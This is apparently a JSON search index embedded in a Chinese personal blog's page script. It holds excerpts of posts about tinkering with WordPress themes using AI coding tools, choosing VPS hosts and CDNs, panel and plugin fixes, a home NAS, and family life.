    </script> </body> </html>  <script>(function(){const searchIndex = [{"title":"博客折腾记之三","content":"也说点题外话，最近OpenClaw（大龙虾）很火，所以我也跟着捣鼓了2个，一个部署在VPS上，一个部署家中的虚拟机中，这两个都没有使用Docker部署，都是跟着官网来的（后面有中文版出来了，尝试了下，但还是用了官方版本）。这个大龙虾挺好玩的，中途也宕机了好几次，一开始都是手工修（一修一个不吱声，太累），后来索性请了Gemini（之前搞了个学生认证），现在大龙虾“躺板板”了，直接Gemini修起来，每次还真让这个Gemini医生给治活了，至此我就省力了，放心大胆的去折腾大龙虾。虽然现在不怕它“躺板板”了，但这家伙是真的能吃（Token消耗起来嘎嘎的快），后面从海鲜市场买了MiniMax不限量月卡（其实就是拼车，6元钱一个月，彼时阿里还没出套餐），识图不行，但写写代码还行。\n很早以前就想捣鼓个Wordpress的无头方案，但都不太理想（主要还是自己水平不够），后面也就懒的弄了，直到最近大龙虾这么多了，咱花了“巨资”养了它，总得让它干活吧，于是便又折腾起来了，先是用了造了个新闻采集站，目前算是能看看（可能我要求不高），心想着再让它整个无头Wordpress吧，不也就是采集嘛，一开始用的是跟这","link":"/say/1664.html","date":"2026-03-01T08:48:11"},{"title":"博客折腾记之二","content":"过去的2025年，大部分都有在用Wordpress，然后大部分时间主题用的也是大发的，一路用下来感觉挺好的，感谢发哥的辛苦付出。本来就想这么一直用下去了，毕竟现在博客更新已经没有之前那般卖力了，虽然每次都是有种种的理由，但是……。这不2026年了嘛，想想要不先换个主题吧，刚好前段时间看到何老师换主题了，一看是威哥的主题，这让我记忆满满呀，想想自己很早以前，就用过威哥的《Weisay Simple》主题（这个主题名还是看到主题介绍才知道的（毕竟好几年了嘛，但那个样子一眼就认出来了），那时看着挺清爽的，很喜欢就用了一段时间，后来折腾劲来了换平台了就没在用了（没办法，我也算是用过几个平台了，Wordpress不算，像Typecho、Ghost、Halo、Zblog、Eblog等，静态的像Hugo、Hexo、Astro等），年轻爱折腾，没事就喜欢捣鼓来捣鼓去，除了很多文章的图丢了，其它的倒没丢多少）。\n\n聊远了，想着这次既然换威哥的主题，那就用最新的——《Weisay Grace》，里面很多的功能正好我也需要，比如：中文评论，有这宝贝那官方的反垃圾评论直接可以丢了；还有评论邮件提醒，又可以丢一","link":"/say/1651.html","date":"2026-01-24T21:32:18"},{"title":"你好，2026","content":"斗转星移，一晃2025年已成为过去，新的2026年已然到来，第一天竟然以下雨方式到来，第一天我又睡懒觉了……，第一天我开始为博客拔草了（上次更新还是3月前），那就开始吧。\n\n1、叛米了\n这里的“米”指的是雷布斯家的小米，我用小米手机不算早，记得最早买过小米4，最后买过红米K60至尊，小米云空间也是16G打底的，算是一个老用户吧，由最初的MIUI系统入局，到手持小米手机，当然这些年我也并非只用小米，因为我是个双手持（左手iPhone，右手安卓），喜欢苹果ios系统（从最初的iPhone4电信写号机开始）。自从上次把iPhone15给老婆当副机用以后，自己便用回最后的LCD机（iPhone11)+小米10S，不过用久了总感觉有点……（想换手机了，11没有5G，而我又有大把的流量、10S虽然可以解决11的问题，但是这电池实在不耐用，偶尔打开看看的状态，一天都要两充），看着身边同事说现在colorOS用着不错，一番的推荐，心想要不加入黑厂耍耍，最后买了台一加13T，到手的感觉真好，小屏、续航猛（同样的使用环境，可以两天一充了），支持5GA，这回可以把流量当“加特林”般使用了，黑厂的系统这几年更","link":"/say/1634.html","date":"2026-01-01T09:47:41"},{"title":"让博客再快一些？","content":"自从把博客搬到HostDZire的机房后，国内走的是EO，国外走的是CF，用着倒也凑合，不过还是觉得EO，哪怕是优选后的，总还是时不时的会抽那么一下，就感觉有点不太稳定（其实就我这个小破站，搁哪也没那么要紧，但这不是爱折腾嘛……），结果在一次逛Nodeseek论坛时，又发现个“灵机”——AnClouds，赶着中秋活动又剁手买了台：中秋特惠香港CN2型（CPU：3 核，内存：3 GB，存储：50 GB，带宽：30 Mbps，流量：不限）活动价：¥138/年，本来也就是打算搞点啥应用测试一下，刚好有一个练手的机子嘛。如果也想来一台测试玩玩的话，可以走我的AFF链接哈：https://www.anclouds.com/aff/BWLLKGFF，目前中秋活动还在（官网首页右上角），除了香港CN2机型，还有香港高防、美西9929这两款机型，如要用的话，还是建议做好数据备份，以防万一。\n\n除了用来测试应用外，还是想用来反代加速博客，此前也搞过一次，用的是Nginx反代，用着也算是稳定，不过管理起来不太方便，这不没事逛论坛，发现一个好东西——AxisNow，这玩意好比自己搭CDN方便多了，自己不用搭","link":"/it/1622.html","date":"2025-10-12T01:38:10"},{"title":"国庆第一天","content":"媳妇给娃报了很多国庆期间的课程（图书馆的免费公开课，诸如手工、绘画、制作之类），娃也欢喜，不仅有的玩，做好的还可以带回家，而且都在室内也凉快。这不国庆第一天就在市图书馆里，2个小时的课程，有妈陪着，我自然就找个地方“摆摊”——带了笔记本，也好消遣一下。今年不打算外出玩了，打算过几天带去看看本地新开的海洋世界（本来计划带去杭州海洋世界的，考虑到节假日的人太多就取消了，刚好本地也新开了，刚好以“山里人”的身份去瞧瞧），或者去边上的一些玩的地方，诸如：欢乐世界（原神网谷景区），网红沙滩等等，主要还是让他动一动，男孩子精力太旺盛了，白天不消耗点，晚上都要折腾得很晚才肯睡。\n今年衢州也在国庆节增加一些游玩景点，除了前面说的海洋世界，还开放了严家淤岛一期，里面有“南孔洛嘉森乐园”和“呦呦萌宠世界”，都是小朋友的好去处，不过这两个地方暂时就不去了，人不是一般的多（节前的周六去从观光车上去转了下，结果等车难，天又热，加上刚建好，油漆味也重，真怕小朋友吃不消），等过段时间稍空再带去玩一下，估计岛上玩个大半天不成问题。这次国庆也还是恒太城一周年庆，据说晚上还有无人机灯光秀等一系列活动，准备晚上带娃去瞧瞧，","link":"/my/1618.html","date":"2025-10-01T15:07:12"},{"title":"为Wordpress升级组件","content":"自从偷懒不想手搓后，便用上BT面板，发现确实是省力不少，不管是配置或升级环境，还是整个计划任务或插件啥的，那简直就是点点点，木啥难度，这不听说Wordpress喜欢8以上版本（如PHP、Mysql等），想想要不咱也来一下，PHP倒是简单直接安装即可（相关的扩展也是要安装的，如opcache、memcached等），但是在版本切换里却傻了（BT版本不够高，不想升级），好在也有解决方案，可以自定义，然后在后面输入：unix:/tmp/php-cgi-84.sock\n\n\nPHP搞好后，顺便把Mysql也从5.7升级到8.0吧，咱这6G的服务器不能浪费嘛，结果升级还得让我先把数据库删除了（这动手前还不得先备份一下），删完了还得卸载才能安装新版本，还真是折腾，早知道这么麻烦俺们就不折腾了，小破站本也没多少看客，但为了满足本站的终身VIP会员——本人那点小心思，还是折腾一下吧，一顿操作下来，现在就是8+8模式了，哈哈。\n\n满足了，睡觉去，有空再捣鼓一下……\n","link":"/say/1593.html","date":"2025-09-07T00:06:40"},{"title":"宝塔面板 Onedrive 插件授权失败的另解之法","content":"自从上次把宝塔中的备份目的地改成Onedrive后，用了也有一段时间，相比其它收费的存储倒是省了一丢丢，不过好景不长，昨天收到备份失败的消息，查看了一下日志，似乎是密钥过期了，那就重新再授权一下吧，结果杯具了——授权失败，卸载掉重装也不行，后来查了，出现这种错误的还蛮多的，一般都说是宝塔给的密钥过期了，好吧，本想跟着教程自己去注册个Microsoft Azure 创建应用程序的，结果试了好几回都以失败而结……\n\n后来想想，我的1Panel上不也是在用嘛，那个都能正常使用没报错，去拷个密钥来替换一下不就好了，马上走起&gt;&gt;&gt;&gt;，来到1Panel的备份账号里，添加一个Onedrive，马上就能看到我想要的东西：\n\n于是把客户端ID和客户端密钥Copy下来，再来到宝塔面板的文件中，找到Onedrive插件的目录：/www/server/panel/plugin/msonedrive/credentials.json，打开这个文件，在onedrive-international里修改相应的参数保存一下：\n\n保存后再去应用商店中的Onedrive里重新按步骤授权一下即可：\n","link":"/it/1590.html","date":"2025-08-18T15:34:34"},{"title":"汽车年检","content":"2019年买的奇瑞车子，今年终于要上线年检了，头一回上线年检汽车，不免有点紧张（好多年以前，那时自己的摩托车还是一年一检，骑到车管所还要被百般“折磨”，非得骑到附近的修理店，花个几十块钱，原先哪哪都有问题的，瞬间就OK了，所以个人内心对年检这事一直有点排斥），在去年检之前，还咨询过同事具体的年检事宜，于是这次准备挑一个最近的第三方年检公司去年检。第三方的好处就是上班早，中午12点半就可以开干了，怕下午上班来不及，所以12点不到就到了，被告知要12点半后才能受理（好吧，那我刷会剧去），不一会就到了12点半，好在今天人不多，第二个就轮到我了，先是登记再去交费，只要240元，比同事的300元又省了点，但不知道为啥，在交钱的过程中内心却有点紧张，这种紧张感就跟当时考驾照时差不多，自己都觉得有点……。交完钱把我行驶证、身份证、车钥匙和几张打印出来的检测单（好像是）放在一个框子里，车辆安全警示标志放在副驾驶位，等检测员来开，按客服的话就是我可以去歇会了，检好之后会通知我。\n\n好吧，《凡人修仙传》还在等我呢，约摸过了大半个小时，检测小哥就回来了，赶紧上去问了一下，小哥说没问题，等车管所审核就好了，放","link":"/say/1580.html","date":"2025-08-06T22:16:20"},{"title":"博客启用新域名fangtang.net","content":"博客已启用新域名：fangtang.net，中文名：方糖，原zfei.net到期后将不再续费，请各位大老爷们别串错门哈（当然目前会进行跳转），域名是方糖的全拼，加上本人也很喜欢喝咖啡（速溶喝的多，手冲倒是不多，人懒……），域名是从论坛上一位老哥那收来的，先谢谢了。各位路过的大佬们，如果有做LOGO方面的高手，可以的话帮俺做一个哈，小弟先行谢过了。\n\n","link":"/say/1573.html","date":"2025-07-25T21:39:05"},{"title":"EdgeOne + Cloudflare，拉我一把","content":"由于目前博客放在AflyCloud的芬兰主机上，加上主机还是台Only ipv6，之前是用Cloudflare优选，凑合着也能用，这不最近EdgeOne比较火，从论坛上花了重金（3元RMB）收了一个，本来是可以参加活动免费来一个的，可每每那个时间点我都不在电脑旁，索性就花钱了事吧。目前博客对境内都解析到EdgeOne上了，境外解析到Cloudflare上，境内走的是EdgeOne的优选（据说有封域名的风险），各位看客来瞅瞅，看看俺们这小博客有没有快了一丢丢。\n\n2025-7-17补充：感觉即使是用了优选，访问速度仍旧是有点慢慢的感觉（也有可能是我优化的刀法有问题），如果使用备案的二级域名，就可以直接使用EdgeOne的国内节点进行加速了，不知那样操作会不会快一些。当然慢跟我的主机所在地也有关系，芬兰还是远了些，要不整个香港的VPS耍耍?除了Oneman，估计也没啥便宜的了，可能最终还是美西更实在些。话说最近EdgeOne推广的这么猛，能坚持多久？\n2025-7-23补充：没事瞎逛论坛，结果买了台HostDzire家的SFO地区（旧金山）主机，4H6G100G的配置，三年72.12刀，遂","link":"/it/1567.html","date":"2025-07-12T21:02:37"},{"title":"买了台Netcup的机子","content":"经常听说Netcup家的机子好，什么老牌、稳定、PT了等等，我这个小博客没啥人气，对机子要求也没那么高，但耐不住这眼睛要去看，脑袋要去想等等，最终在这次活动买了台，1.25欧的价格拿下一台美东的机子（原价6.25欧，新人优惠了5欧），跑脚本测试了下，IP倒是真干净，速度一般般（毕竟真身在美国东部，而且还是普通线路），老样子装了个宝塔及一些相关插件，这速度确实是比我之前用过的机子都要快，配置高确实是有优势的。如果放网站的话，简单点直接上CF，应该访问起来跟我这台芬兰的Aflycloud应该也差不多，不知道用美西的线路机拉一拉会不会更快一些……。因为还没确定要用，所以暂时也就没有把博客等应用进行搬家，待我再想想……。\n\n这是测试链接：点击打开\n差点忘了个事，之前还在NodeSeek论坛抽奖中获得了一个月的机子，是Netjett（YVGS），配置相近，就是硬盘少了一半，好像是德国的机子，续费3.75镑/月，不过商家有过一段失联（据说是整个团队被拘了一个星期），这两天就到期了，鉴于这种情况还是不续费了，这一点Netcup应该要稳定些。目前博客使用的是Aflycloud家的黑五机子，16.99刀","link":"/it/1557.html","date":"2025-06-27T14:48:20"},{"title":"今天有点背","content":"今天是周六本是休息的一天，可从早上8点不到就被电话吵醒，然后就隔一段时间一个电话，都是工作上的事，我也是服了，感觉平常上班也不会这么赶巧，咋一休息就这么多的事，唉……。结果就是今天回老家看爸妈也是带着笔记本，生怕有个事不能远程处理。不过好在后面也都电话里沟通处理好了，笔记本在包里躺了一天。本以为就这么过去了，可谁想着，晚上回家又碰上事了，先是指纹锁提示电量低（提示音都很轻了），差点没锁在门外……。回来时下大雨淋湿了，就想着先洗澡再开电脑，结果放了好一会的冷水就是没有热水，然后跑到燃气表那（没到那就听见“滴滴声……）了，打开橱柜门一看，燃气表上显示“----LO----\"，一看说明是没电（有那滴滴声的电量，就是不给我洗澡），结果家里翻了一会，一节有用的5号电池都没找到，本想去下楼去便利店买，结果又开始下大雨了，真就了那句话“茅房去拉屎，发现忘带纸”，好背呀。好在最近淘宝闪购有活动，那我就点个外卖买电池呗，澡嘛，只能等会再洗了。\n\n电池外卖终于到了，花了16.9元，买了南孚5号电池8节，7号电池4节，外加百事可乐4听，康师傅冰红茶（大瓶）2瓶，感觉还是外卖实惠呀，去店里花这个钱哪里买的到，","link":"/my/1547.html","date":"2025-06-14T21:38:51"},{"title":"博客折腾记之一","content":"自从昨天把CC出掉之后，博客等一众网站便搬到了Aflycloud的芬兰机子上（喝说是黑五的活动款，不过现在还能买，之前开了100多天也没重启过），这纯ipv6的机子套上cloudflare的优选IP后，勉强也算是能用吧（至少我个人感觉）。现在懒的不想手搓环境了，直接BT一拉，刚刚又把PHP升级到了8.4版本（据说这个版本提升了很多……）。目前也懒的去弄其它机子缓存了（阿里云的机子再过几个月也快到期了，300元的代金券白嫖来的），暂时先用cloudflare，过段时间手痒了再折腾呗。主题也换成bigfa制作的Hera（之前自己用Cursor捣鼓的主题还是有很多问题），各位路过的看客老爷们，顺手也来踩踩，欢迎哈。\n","link":"/say/1542.html","date":"2025-06-09T20:57:57"},{"title":"最近的事@10","content":"\n        儿童节：今年的儿童节刚好是周日，也刚好是端午放假，不过老婆大人上班，想着要不要送点礼物或带出去玩一下，刚好娃最近比较喜欢收集卡游的哪吒卡片（之前随购物车买了10包，他自己去小店里买是2元/包，随购物车就花了9元多），他也是偶尔买买，所以也就随着他了。然后儿童节那天给了他7包，收了他10元钱，我跟他说买5张送2张，后面就陪他一起拆卡，不过运气不错，这7包里拆出了好多他没有的卡，把他给高兴的（上幼儿园的小娃娃还是比较满足的）。\n\n\n\n\n\n\n\n然后下午花了一百多块钱在抖音上买了双港游乐园的门票，本来里面最有价值的我感觉是卡丁车，那时刚去的时候人也不多，可偏偏这小家伙竟然不屑一顾（估计是平常9号卡丁车开多了，没想法了），不过后面很多的无动力和有动力的倒是都玩了，一个下午玩的满头是汗，自己的水壶喝完，还喝了半瓶娃哈哈，结果还是不肯走，最后只能拿蜜雪出来诱惑一下，方才舍得回家。\n\n\n\n        藏海传：最近追的电视剧，前几天终于看完了，AI给的评价是：《藏海传》正在央视、优酷热播。幼年稚奴全家被平津侯灭门，他改名藏海，苦学十年后复仇。剧中摒弃爽剧套路，藏海在权谋中经历精神淬","link":"/my/1524.html","date":"2025-06-08T09:31:34"},{"title":"又想换域名了","content":"这年头不想写文章就折腾主题，不折腾主题就想到域名了，当时用057000.xyz是想着域名便宜，后来又换成了zfei.net，那段时间刚好在看电视剧《孤舟》，挺喜欢张颂文老师演的周知非，所有便有了这么个域名。最近不知咋的，又注册了个域名：lfp.im，lfp是我自己姓名的拼音缩写，im域名配上刚好就如中文：我是谁谁谁（当年钢铁侠不是有句“I'm Ironman”）。续费价格上，im域名和net域名续费都差不多，数字xyz当然是最便宜的。各位路过的大佬，有空来帮忙分析分析，先行谢过了\n","link":"/say/1521.html","date":"2025-05-28T13:12:09"},{"title":"五一劳动节快乐","content":"五一劳动节，是一个放松身心、享受生活的日子。我希望每一位还在奋斗的“牛马们”都能暂时放下手头的工作，给自己一个喘息的机会，去感受大自然的美好，去享受与家人朋友的欢聚时光。毕竟，劳动的目的是为了更好的生活，而生活的真谛在于享受每一个当下。愿这个假期，您能够收获满满的快乐和满足，愿您在休息和放松中，找到新的动力和灵感。最后，再次祝愿大家五一劳动节快乐，愿您的每一天都充满阳光和希望💯\n\n","link":"/say/1518.html","date":"2025-05-01T13:42:04"},{"title":"暂时取消网站缓存","content":"为了达到个人的那点小九九，所以加了Service Worker进行本地缓存，结果发现很多时候需要强制刷新才能看到新的内容或评论，还有一些问题比如评论提交不了等（不过我自己测试时倒是没有发现），然后最近也比较忙，懒得去找Cursor进行调整了，那就索性先关掉试一段时间再看看，排除一下是不是这个Service Worker引起的。\n","link":"/say/1515.html","date":"2025-04-28T15:54:09"},{"title":"最近的事@9","content":"\n好久没有以这个命题发牢骚了，本来可以简单的发点说说，但看看好久没水上一篇了，还是抽空来啰嗦两句，要不然草长的太高了不太好，哈哈。\n\n\n\n博客：自从Typecho加到Wordpress后，用的是笔记的Wing主题，一个非常棒的主题，让好多人都为之魔改，当然也包括我，如今在AI的加持下，再也不用动不动就百度或谷歌了，啥不会的直接扔给AI，所以改到最后，也但有了给自己倒腾一个主题的想法（一直都有，只是苦于能力有限），前前后后反反复复的磨，一点一点的按自己和意愿加功能，这不就有了现在这个黑白色调的单栏主题，原本Wing主题有的笔记（说说）功能那么好用，必须我这也有，所以新主题除了文章，还能玩说说，以至于连Memos都懒的写了，当然以后还会时不时的缝缝补补，也有可能还会加一些自己认为喜欢的功能，真正的实现了一把：我的地盘我做主。\n\n\n\n主机：目前手上拥有还未到期的主机，还真不少，不过大部分都是今年要到期了，有免费领来的阿里云香港轻量（当时用学生300元优惠券买的，还给找零了），不过配置不高，东西跑多有点卡，所有目前用来反代+缓存博客。还有一些月付的oneman主机，10.1元就能拥有4H4G美","link":"/my/1513.html","date":"2025-04-16T15:28:35"},{"title":"将说说添加到首页","content":"之前说说发表后是只显示在说说列表中，并没有在首页和RSS中显示，这样感觉说说被“淡化”了（主要是没人来评论了，当然我这小破站本身也没几个观众老爷），但既然发现了，不改肯定是不行的，那想改就改起来吧，借助AI的帮忙，这个目前也算是解决了🤗\n","link":"/say/1511.html","date":"2025-04-13T00:10:38"},{"title":"想给网站提提速","content":"自从网站搬到CC家后，这网速就没有之前的快了，看着手上还有些没到期的主机，要不利用起来，反代+缓存一下，找Cursor写了配置文件，这不现在已经由浅绿变深绿了，国内的指向阿里云的香港轻量、国外的都扔给赛博活佛了，先使用一段时间看看效果如何再定是否长期使用。不过今天又迎来了一个垃圾评论，不知道是不是跟这个有关系，可恶的垃圾评论💪\n\n","link":"/say/1510.html","date":"2025-04-11T13:20:09"},{"title":"最近的天气","content":"最近的天气就跟过山车似的，时而拉到最高，时而又来个反转，这天气真有点买多少送多少的感觉，身体弱的就麻烦了🤣\n\n","link":"/say/1507.html","date":"2025-04-10T13:02:03"},{"title":"修改说说样式","content":"不知为啥总觉得说说的样式不太满意，这不又操起Cursor一番乱砍，结果就砍出这么个样式，又折腾的这么晚了，呼呼了🤗\n\n","link":"/say/1504.html","date":"2025-04-06T01:39:21"},{"title":"博客这两天终于安静下来了","content":"\n自从加了评论数字验证之后，这两天安静多了，垃圾评论目前没有了（暗暗庆幸一下），也不知道这班机器人图啥，一天到晚的一堆垃圾评论，删删都烦，现在好了，又恢复之前的平静了🎉\n\n\n\n\n","link":"/say/1481.html","date":"2025-04-05T22:43:26"},{"title":"晚上出来溜溜","content":"天气不错，晚上出来转转，广场是真热闹呀，到处是跳广场舞的，还好找到了个僻静的地方，坐一会\n\n","link":"/say/1477.html","date":"2025-04-04T19:51:31"},{"title":"Cursor让人疯狂的工具","content":"Cursor确实是个好工具，但是如果有的不当，那效果也是杠杠的好，这不给说说加了个图片上传等功能，结果又把其它样式给搞乱了，我都没让它改，可就“顺便”给改了，然后我又兜兜转转的修改了，是不是挺搞笑的，当然也有可能是我这个工具人给的提示词不够优秀，看来下次给提示词之前先过一下其它AI试试看。\n\n","link":"/say/1475.html","date":"2025-04-04T12:00:49"},{"title":"说说也可以图文并茂了","content":"最近一有空就在折腾这主题（太磨人了），这不给说说也加上图片上传功能了，并调整了部分样式，可以休息一会了，哈哈😀😀\n\n","link":"/say/1473.html","date":"2025-04-04T10:01:32"},{"title":"垃圾评论回收站","content":"\n这段时间改用新主题后，这垃圾评论感觉也多了起来，感觉以前用Wing主题时也没看见有这么多呀，这是在欺负人吗？目前新主题的Bug还是很多，所有逮着空就拿Cursor来修复一番，写到这我是真佩服那些仍在使用古法制作主题的强者，具体的俺就不细说了，真是一群高人呀，反正我是做不到的，像我这种懒癌（伸手党），只能依靠AI了，哈哈。\n\n\n\n\n\n\n\n看到了吧，一天好几条，真把我这当成垃圾评论回收站了，本来可以安装插件来进行屏蔽，但想想既然Cursor这么牛，干脆让它再给我的评论系统加一个验证吧，一开始加的是滑动验证，我试了一下还挺好的，不滑动验证的话，点击提交评论按钮是没有反应的，本想着这会可以舒坦了吧，结果中午改好，下午又是好几条，咋的这滑动验证只是用来防范我自己的？（防我这种小白？）。\n\n\n\n好吧，既然你们这么狠，我也只好再改改了，这不又有了目前的数字验证的功能，反正咋说呢，我感觉不管加什么验证都是反人类的，不友好的，可我友好了，也没见那些人（可能是bot吧）友善是不，那就整起来，我先给各位人类朋友鞠个躬，哈哈。\n\n\n\n时间不早了，洗洗睡了，哪天有时间再接着修Bug，搞主题还是太累了，至少对于","link":"/it/1463.html","date":"2025-04-03T23:29:21"},{"title":"忙碌的一天","content":"周一还真是忙碌呀，从上午9点开始到下午17点下班，中午都没休息过，弄的我是又累又困，还饿……，这要是天天这么整，直接可以躺平了😅\n","link":"/say/1451.html","date":"2025-03-31T22:14:22"},{"title":"Cursor赋能：制作个人单栏WordPress主题","content":"\n在经历了无数次的精雕细琢和反复调试之后，我利用Cursor开发平台，成功打造了一款简约风格的WordPress主题。这个作品以经典的黑白撞色为主色调，采用单栏布局，最大化地展现了内容展示的空间。通过简约而克制的美学设计，我努力营造出一种沉浸式的阅读体验。在开发的过程中，我经历了十余次的版本迭代，从排版间距的像素级调整到响应式交互的持续优化，最终使这个主题达到了可发布的状态。现在，我正式与大家分享这份数字美学的实践成果。\n\n\n\n\n\n\n\n 哈哈，其实标题和前面的短文都是由伟大的Deepseek R1生成的，图片则是交给豆包生成的。目前我使用的主题确实是我这个新手用Cursor，通过断断续续的努力，花了好几天的时间才完成的。我个人还是比较喜欢单栏的主题，过去也曾尝试过手动改版，但总感觉做得不够好，总是有这样或那样的小问题。当然，这次用Cursor制作的主题肯定也会有一些小瑕疵，但先让它跑起来，这样才能发现问题嘛。\n\n\n\n 这次使用Cursor的经历让我意识到，有时候也不能过于依赖工具。很多时候，如果提示词没给对，或者一次性输入了过多的内容，这个强大的Cursor可能会生成一堆代码，甚至在不","link":"/it/1450.html","date":"2025-03-31T21:53:48"},{"title":"用Cursor折腾了一个主题","content":"如题，全小白折腾个主题太折磨人了，先凑合用吧😄\n","link":"/say/1420.html","date":"2025-03-30T11:25:42"},{"title":"折腾 博客搬家","content":"#⚒️折腾 博客之前托管在一个小众（Oneman）的美西的服务器，10.1元/月的4H4G的Kurun，据说是“采用三网直连CN2+CMI+9929三网极致优化”，用起来速度感觉也还好，但这两天商家忽然把售后QQ群解散说要跑路了，然后不久官网又打不开了（刚刚看看可以打开了），我自己的主机也在今天早上忽然关机了，心里真是有点后怕，虽然过了一段时间后主也开了，但总觉得有点不太稳的感觉（软云事件之后，现在网站所有关键数据都是每日备份的）。现在有点后悔上次没上车瓦工的Megabox，虽然现在也有补救办法，不过想想瓦工也不便宜，那就整个CC家的吧，这家虽然硬件、线路都是一般般，至少还有很多大佬在用，随后在论坛收了个22刀的4C4H80G的（21刀的溢价太贵了），经过1个小时的搭建、搬家，现在博客已正式部署在CC上了，欢迎各位大佬来踩踩。\n","link":"/say/1413.html","date":"2025-03-22T22:16:14"},{"title":"折腾  Rustdesk远程","content":"#⚒️折腾 一直都在用Rustdesk作为远程软件，加上自己用腾讯轻量云搭建的中继服务器用了一年多挺稳定的，速度也是秒杀向日葵或Todesk，但上周末突然就连不上了，一直提示“不在线，已关机”等类似的字样，但打开客户端软件，左下角显示的也是就绪，重启了服务器仍旧一样，干脆重装了系统、环境、软件后（配置好），客户端左下角一直显示“未就绪，请检查网络”，折腾了好久还是不行，最后发现这玩意走的是UDP协议，但是我在防火墙上只放行了TCP协议，改成UDP后，果然从之前的“未就绪”显示成“就绪”，重配了一下手机的中继服务器等，试了下还是跟以前一样丝滑，又可以远程办公了。\n","link":"/say/1408.html","date":"2025-03-18T21:23:04"},{"title":"折腾 博客功能和样式修改","content":"#⚒️折腾 逮着空了就折腾一下博客，AI+我这个不入流的，现在也可以改主题、改代码了（虽然以前没有AI时也折腾，不过哪有现在这般方便、快捷），感觉这么改下去，不知道哪天整崩了，估计就有理由换主题了。目前把归档和前台发说说的功能都修改了一下，一切都是以方便自己为目的嘛，哈哈😉\n","link":"/say/1403.html","date":"2025-03-15T23:46:48"},{"title":"折腾 博客说说（原笔记）加标题","content":"#⚒️折腾 还是要给说说（原笔记）加一个标题功能，要不然每次有评论都不知道是哪个，那就折腾一下吧，加个上去，用AI确实方便呀，顺便把文档也改了一下，什么文章归档、说说归档都有了，这魔改的道路真是没完没了呀，一路折腾一路嗨，哈哈。\n","link":"/say/1394.html","date":"2025-03-09T11:11:52"},{"title":"给博客加一个Service Worker耍耍","content":"\n先说个题外话，上次抄了沉沦大佬的作业《适配评论头像本地缓存功能》，实现了头像下载并缓存到主机上，加快了头像的加载速度，不过在我的博客上却碰了一些问题：一些没有头像或头像链接失效的，就拖慢了页面有显示，最终交由DeepSeek修正了下，完美解决了我的这个问题，涉及的部分代码如下：\n\n\n\n// 定义头像缓存目录\ndefine('AVATAR_CACHE_DIR', WP_CONTENT_DIR . '/avatars');\n// 定义头像缓存URL\ndefine('AVATAR_CACHE_URL', WP_CONTENT_URL . '/avatars');\n// 定义头像缓存有效期，默认7天\ndefine('AVATAR_CACHE_LIFETIME', apply_filters('avatar_cache_lifetime', 7 * DAY_IN_SECONDS));\n// 定义头像最大存储时间，默认30天\ndefine('AVATAR_CLEANUP_AGE', apply_filters('avatar_max_age', 30 * DAY_IN_SECONDS));\n//","link":"/it/1376.html","date":"2025-03-07T22:31:37"},{"title":"折腾 博客折腾记","content":"#⚒️折腾 上次抄了沉沦大佬的作业《适配评论头像本地缓存功能》，挺好的，头像可以缓存在本地主机上了，但也碰到了一些问题，比如一些获取不到的头像就会影响加载速度，直接把代码丢给DeepSeek一番修改后，这个问题也解决了。后来又看到了一篇利用Service workers来加速博客的文章，心痒痒也想自己整一个，，现在也有了，不过感觉速度提升也不是很明显，也有可能某些地方没整好吧，下次空了再捣鼓一下。本来想好好水一篇的（毕竟好久没更了），但最后还是笔记一篇，果然还是写个短文更适合我，方便不费脑，哈哈\n","link":"/say/1375.html","date":"2025-03-07T00:00:00"},{"title":"吐槽 哪吒2","content":"#📢吐槽 哪吒2，确实好看，能够碾压其它电影票房，确实是有实力的，之前看的是CGS屏，现在看了很多评论后，听说IMAX 3D效果更好，看来得去二刷再支持一下。\n","link":"/say/1366.html","date":"2025-02-07T10:01:02"},{"title":"折腾 家里的自组NAS","content":"#⚒️折腾 家里的自组NAS最近老是歇菜，电源、内存都换过了，还是会，想想要不要干脆更新个BIOS试试看，结果更新到9%花屏了，等了很久还是一样，强制关机再开机，结果开不了了，赶紧网上找教程，还好现在主板上有Q-Flash功能，赶紧照抄教程搞起来：\n\n1.U盘需要格式化为FAT32格式，必须是USB2.0(3.0及以上存在几率不行)，插在主板IO上写着bios的USB插槽\n\n2.bios文件一定是后缀名为这一版bios版本编号的文件，然后直接整个名字连后缀一起改成gigabyte.bin\n\n3.按一键装bios按钮的时候，拔掉显卡，内存，可不拔CPU供电，必插主板24pin供电\n\n4.按下去后开始快速闪烁，变成慢闪烁之后就说明装上了，再把cpu供电，内存和显卡插上，这个时候应该能装的上了\n\n忘了说了，俺的主板是技嘉的，经过这么一折腾，开机后一会又关机又开机……，来回折腾了几回，终于看到了开机LOGO，主板又救回来了。\n\n\n","link":"/say/1362.html","date":"2025-02-01T22:31:14"},{"title":"日常-新的一年","content":"#📅日常 2024已经远去，新的2025也已到来，期望新的一年一切都好，也希望身边所有的人身体健康、开心常伴，同时也祝愿各位博友新年快乐！\n","link":"/say/1357.html","date":"2025-01-01T00:14:52"},{"title":"折腾 再一次折腾我的NAS","content":"#⚒️折腾 再一次折腾我的NAS，上周末整了个飞牛OS+群晖+Win，结果问题很多（比如：重启后很多参数丢失，需要手动运行，加了定时任务也没有凑效），最终以失败而终。今天继续折腾，回归老样子，直接跑黑群晖+win+docker等，这个套路还是比较熟悉的，原先群晖里的数据 （不管用哪个平台，如PVE、Esxi等都是直通硬盘给群晖用的）都在，所以这次也就是重装一下套件，设置一下相关参数等，反正目前已经可以使用了，文件同步起来，电影下载起来，资料备份起来……\n","link":"/say/1335.html","date":"2024-12-28T00:02:44"},{"title":"日常  冬至夜","content":"#📅日常 今天是冬至夜，按我这老话说的：冬至夜，有的吃吃一夜，没的吃冻一夜。家里一堆东西也没见大家吃了多少，倒是我吃的挺多，嗑点瓜子，吃点冻米糖，喝点柚子汁，目前点有小撑了。\n","link":"/say/1332.html","date":"2024-12-20T21:59:17"},{"title":"Wordpress外链跳转到中间页","content":"\n记得之前还在Wordpress的时候，曾经捣鼓了一个跳转页(原文章链接)，后来换成Typecho后，用的是姜先森的主题，也就直接用着他的跳转方式。回到Wordpress(后简称WP)后，就一直没弄，刚好中午闲逛，又让我看到了其它博主的跳转页，感觉不错，那就赶紧“作业抄起来”。\n\n\n\n\n\n\n\n\n\n\n\n这个跳转页参照了空白大佬的，太多技术性的咱就不说了，都是抄作业，下面就细说一下步骤：\n\n\n\n\n在网站根目录下新建一个文件夹，例如 mygo ，再在里面新建几个文件如： go.js 、 go.html 、 go.css ，跳转页的图片自己抠一下吧。\n\n\n\ngo.js文件内容：\n\n\n\n\nfunction checkParent(element, classNames) {\n    while (element) {\n        if (element.classList &amp;&amp; classNames.some(cn =&gt; element.classList.contains(cn))) {\n            return true;\n        }\n     